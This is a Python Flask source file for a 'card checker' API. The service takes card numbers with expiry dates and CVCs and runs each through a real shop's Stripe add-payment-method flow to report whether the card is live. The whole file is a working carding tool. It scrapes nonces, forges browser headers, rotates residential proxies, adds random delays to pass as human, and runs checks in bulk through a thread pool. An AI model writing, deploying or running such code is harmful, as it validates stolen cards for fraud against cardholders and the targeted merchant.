import os
import re
import time
import uuid
import random
import requests
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor, TimeoutError
from user_agent import generate_user_agent
from colorama import Fore, Style # Assuming colorama is for console output only

# Initialize Flask app
app = Flask(__name__)

# --- Configuration ---
# Uncomment and set your API_KEY environment variable for production
# app.config['API_KEY'] = os.environ.get('YOUR_API_KEY') # e.g., in Render Env Vars

MAX_WORKERS = 10 # Number of concurrent card checks your API can handle
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

# --- INTERNAL RESIDENTIAL PROXY POOL ---
# IMPORTANT: For production, this list should ideally be EMPTY or populated
# from a secure source (e.g., environment variables, a database)
# NEVER hardcode sensitive proxies in production code.
# This is primarily for demonstration or very small-scale internal testing.
#
# Format: "scheme://user:pass@host:port" or "scheme://host:port"
RESIDENTIAL_PROXIES = [
    # Example (replace with your actual proxies):
    # "http://user1:pass1@proxy1.example.com:8080",
    # "https://user2:pass2@proxy2.example.com:8443",
    # "http://192.168.1.1:8000",
]

# --- Color Definitions (for console logging, not directly for API response) ---
D = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RESET = Style.RESET_ALL

# --- Utility Functions ---

def parse_proxy_string(proxy_str):
    """
    Parses a proxy string into a dictionary format suitable for requests.
    Handles formats like:
    - host:port
    - user:pass@host:port
    - scheme://host:port
    - scheme://user:pass@host:port
    - Also tries to handle quantumproxies.net specific format if it's consistent
      like host:port:user:pass
    """
    if not proxy_str:
        raise ValueError("Proxy string cannot be empty.")

    original_proxy_str = proxy_str # Keep for error messages

    # Default scheme if not provided
    scheme = "http"
    if "://" in proxy_str:
        scheme, proxy_str = proxy_str.split("://", 1)

    # Try to parse based on standard format first
    if "@" in proxy_str:
        auth_part, host_port_part = proxy_str.split("@", 1)
        if ":" not in auth_part or ":" not in host_port_part:
            raise ValueError(f"Malformed proxy string after '@' or authentication part: {original_proxy_str}")
        user, password = auth_part.split(":", 1)
        host, port = host_port_part.rsplit(":", 1) # rsplit to handle IPv6 or multiple colons in host (less likely here)
        return {
            "http": f"{scheme}://{user}:{password}@{host}:{port}",
            "https": f"{scheme}://{user}:{password}@{host}:{port}",
        }
    else:
        # If no '@', check if it's host:port, or host:port:user:pass (like your quantumproxies)
        parts = proxy_str.split(":")
        if len(parts) == 2: # host:port
            host, port = parts[0], parts[1]
            return {
                "http": f"{scheme}://{host}:{port}",
                "https": f"{scheme}://{host}:{port}",
            }
        elif len(parts) == 4: # host:port:user:pass (common for some providers)
            host, port, user, password = parts
            return {
                "http": f"{scheme}://{user}:{password}@{host}:{port}",
                "https": f"{scheme}://{user}:{password}@{host}:{port}",
            }
        else:
            raise ValueError(f"Unrecognized proxy format: {original_proxy_str}. Expected host:port, user:pass@host:port, or host:port:user:pass.")

# --- Card Checking Logic ---
def check_card_with_proxy(card_full_string, proxy_param_from_user=None):
    """
    Performs the Stripe card check for a single card with optional proxy.
    If proxy_param_from_user is None, an internal residential proxy from the pool will be used (if available).
    Returns a dictionary with status, message, and card details.
    """
    cc, mm, yy_full, cvc = [part.strip() for part in card_full_string.split('|')]
    yy = yy_full[-2:] # Get last two digits of the year

    proxies_dict = None
    selected_proxy_info = "No proxy used" # For logging

    if proxy_param_from_user:
        try:
            proxies_dict = parse_proxy_string(proxy_param_from_user)
            selected_proxy_info = f"User-provided proxy: {proxy_param_from_user}"
            app.logger.info(f"Using user-provided proxy: {proxy_param_from_user} for card {card_full_string}")
        except ValueError as e:
            app.logger.error(f"Invalid user-provided proxy format '{proxy_param_from_user}': {e}")
            return {"status": "error", "message": f"Invalid user-provided proxy format: {e}", "card": card_full_string}
        except Exception as e:
            app.logger.error(f"Error parsing user-provided proxy '{proxy_param_from_user}': {e}")
            return {"status": "error", "message": f"Error parsing user-provided proxy: {e}", "card": card_full_string}
    elif RESIDENTIAL_PROXIES:
        # Use an internal residential proxy if available and no user proxy provided
        chosen_raw_proxy = random.choice(RESIDENTIAL_PROXIES)
        try:
            proxies_dict = parse_proxy_string(chosen_raw_proxy)
            selected_proxy_info = f"Internal residential proxy: {chosen_raw_proxy}"
            app.logger.info(f"Using internal residential proxy: {chosen_raw_proxy} for card {card_full_string}")
        except ValueError as e:
            app.logger.error(f"Invalid internal residential proxy format '{chosen_raw_proxy}': {e}")
            return {"status": "error", "message": f"Internal proxy format error: {e}", "card": card_full_string}
        except Exception as e:
            app.logger.error(f"Error parsing internal residential proxy '{chosen_raw_proxy}': {e}")
            return {"status": "error", "message": f"Internal proxy parsing error: {e}", "card": card_full_string}
    else:
        app.logger.warning(f"No proxy configured for card {card_full_string}. Proceeding without proxy. This is not recommended.")


    session = requests.Session()
    if proxies_dict:
        session.proxies.update(proxies_dict)

    us = generate_user_agent()
    gu = uuid.uuid4()
    mu = uuid.uuid4()
    si = uuid.uuid4()

    try:
        # Add a short random delay before starting the check to mimic human behavior
        time.sleep(random.uniform(1, 3)) # Delay between 1 and 3 seconds

        # --- Step 1: Get initial page and extract nonce and key ---
        # Increased timeout slightly for potentially slow proxy connections
        re1 = session.get(
            'https://shop.wiseacrebrew.com/account/add-payment-method/',
            headers={'user-agent': us},
            timeout=20 # Increased timeout
        )
        re1.raise_for_status()

        value1_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', re1.text)
        keyy_match = re.search(r'"key":"(.*?)"', re1.text)

        if not value1_match or not keyy_match:
            app.logger.warning(f"Failed to extract nonce or key for {card_full_string}. Proxy/IP might be blocked. Response snippet: {re1.text[:500]}")
            return {"status": "declined", "message": f"Failed to get nonce or key from target site. (Site might be blocking requests from {selected_proxy_info})", "card": card_full_string}

        value1 = value1_match.group(1)
        keyy = keyy_match.group(1)

        # Add a short random delay before the next request
        time.sleep(random.uniform(0.5, 1.5))

        # --- Step 2: Create Payment Method with Stripe API ---
        stripe_api_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': us,
        }
        stripe_api_data = (
            f'type=card&card[number]={cc}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            '&allow_redisplay=unspecified&billing_details[address][country]=IQ&pasted_fields=number'
            '&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+payment-element%3B+deferred-intent'
            '&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=79611' # Consider randomizing time_on_page
            '&client_attribution_metadata[client_session_id]=36ad9e12-a56a-4c82-b4bb-1d9899ee6137' # Randomize these IDs
            '&client_attribution_metadata[merchant_integration_source]=elements'
            '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            '&client_attribution_metadata[merchant_integration_version]=2021'
            '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
            f'&guid={gu}&muid={mu}&sid={si}&key={keyy}&_stripe_version=2024-06-20'
        )

        stripe_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_api_headers,
            data=stripe_api_data,
            timeout=20 # Increased timeout
        )
        stripe_response.raise_for_status()
        json_response = stripe_response.json()
        idd = json_response.get('id')

        if not idd:
            error_message = "Payment method creation failed."
            if 'error' in json_response:
                error_info = json_response['error']
                error_message = error_info.get('message', error_message)
                error_code = error_info.get('code', 'N/A')
                decline_code = error_info.get('decline_code', 'N/A')
                error_message = f"Stripe Error: Code - {error_code}, Decline Code - {decline_code}, Message - {error_message}"
            app.logger.info(f"Stripe payment method creation failed for {card_full_string}: {error_message}")
            return {"status": "declined", "message": error_message, "card": card_full_string}

        # Add a short random delay before the final request
        time.sleep(random.uniform(0.5, 1.5))

        # --- Step 3: Confirm Setup Intent on Wiseacrebrew Website ---
        confirm_headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'priority': 'u=1, i',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
        }
        confirm_params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        confirm_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idd,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': value1,
        }

        final_response = session.post(
            'https://shop.wiseacrebrew.com/',
            params=confirm_params,
            headers=confirm_headers,
            data=confirm_data,
            timeout=20 # Increased timeout
        )
        final_response.raise_for_status()
        msg = final_response.text

        decline_phrases = [
            'Your card has insufficient funds.',
            'Your card does not support this type of purchase.',
            "Your card's expiration month is invalid.",
            "Your card's security code is incorrect.",
            "The card's security code is invalid.",
            "insufficient funds.",
            "Your card was declined."
            # Add more specific decline phrases as you encounter them
        ]

        if any(phrase in msg for phrase in decline_phrases) or cvc == '000':
            app.logger.info(f"Card {card_full_string} declined. Message: {msg.strip()}")
            return {"status": "declined", "message": msg.strip(), "card": card_full_string}
        else:
            app.logger.info(f"Card {card_full_string} approved.")
            return {"status": "approved", "message": "Approved", "card": card_full_string}

    except requests.exceptions.Timeout as e:
        app.logger.error(f"Request timed out for {card_full_string} via {selected_proxy_info}: {e}")
        return {"status": "error", "message": f"Request timed out. This can happen with slow proxies or site issues. ({selected_proxy_info})", "card": card_full_string}
    except requests.exceptions.HTTPError as e:
        # HTTP errors like 403, 404, 500 etc.
        app.logger.error(f"HTTP Error for {card_full_string} via {selected_proxy_info} (Status {e.response.status_code}): {e.response.text[:200]} - {e}")
        if e.response.status_code == 403:
            return {"status": "error", "message": f"Site blocked access (403 Forbidden). Proxy might be detected or IP rate-limited. ({selected_proxy_info})", "card": card_full_string}
        elif e.response.status_code == 400: # Bad Request
             return {"status": "error", "message": f"Bad request sent to target (400 error). Check headers/data. ({selected_proxy_info})", "card": card_full_string}
        else:
            return {"status": "error", "message": f"Network error during check (HTTP {e.response.status_code}). ({selected_proxy_info})", "card": card_full_string}
    except requests.exceptions.ConnectionError as e:
        app.logger.error(f"Connection Error for {card_full_string} via {selected_proxy_info}: {e}")
        return {"status": "error", "message": f"Failed to connect to target or proxy. Proxy might be down or blocked. ({selected_proxy_info})", "card": card_full_string}
    except requests.exceptions.RequestException as e:
        # Catch all other requests-related exceptions
        app.logger.error(f"General Request error for {card_full_string} via {selected_proxy_info}: {e}")
        return {"status": "error", "message": f"A network request error occurred: {e}. ({selected_proxy_info})", "card": card_full_string}
    except Exception as e:
        # Catch any other unexpected errors
        app.logger.critical(f"An unexpected critical error occurred for {card_full_string}: {e}", exc_info=True)
        return {"status": "error", "message": f"An unexpected internal error occurred: {e}", "card": card_full_string}

# --- API Endpoint ---
@app.route('/auth', methods=['GET'])
def clover_check():
    # --- API Key Authentication (Uncomment and implement if needed) ---
    # api_key = request.headers.get('X-API-Key') # Or request.args.get('api_key')
    # if app.config.get('API_KEY') and api_key != app.config['API_KEY']:
    #     app.logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
    #     return jsonify({"status": "error", "message": "Unauthorized: Invalid API Key"}), 401

    card_param = request.args.get('card')
    proxy_param = request.args.get('proxy') # This will be the user-provided proxy

    if not card_param:
        return jsonify({"status": "error", "message": "Missing 'card' parameter. Expected format: CC|MM|YYYY|CVC"}), 400

    # Validate card format (simple regex check)
    # Allows for optional spaces or hyphens, but the split will clean them.
    # The regex is just for quick validation of structure.
    if not re.match(r'^\d{13,19}[|\s-]\d{1,2}[|\s-]\d{2,4}[|\s-]\d{3,4}$', card_param):
        return jsonify({"status": "error", "message": "Invalid card format. Expected CC|MM|YYYY|CVC or similar. Example: 1234567890123456|12|2025|123"}), 400

    # Submit task to the thread pool
    # Pass proxy_param directly. If None, check_card_with_proxy will use internal pool.
    future = executor.submit(check_card_with_proxy, card_param, proxy_param)

    try:
        result = future.result(timeout=90) # Increased timeout to 90 seconds for potentially slower checks
        return jsonify(result)
    except TimeoutError:
        app.logger.warning(f"API processing timeout for card {card_param}. Task took too long.")
        return jsonify({"status": "processing_timeout", "message": "Card check took too long to complete. This can happen with slow proxies or site issues. Please try again later.", "card": card_param}), 504
    except Exception as e:
        app.logger.critical(f"Unhandled exception in API endpoint for card {card_param}: {e}", exc_info=True)
        return jsonify({"status": "error", "message": f"Internal server error: {e}", "card": card_param}), 500

# --- Health Check (Optional but good practice) ---
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "ok", "message": "API is running."})

# --- Run the Flask App ---
if __name__ == '__main__':
    # For local development:
    app.run(debug=True, host='0.0.0.0', port=5000)
    # For production, use Gunicorn (as configured in Procfile for Render):
    # gunicorn -w 4 -b 0.0.0.0:$PORT app:app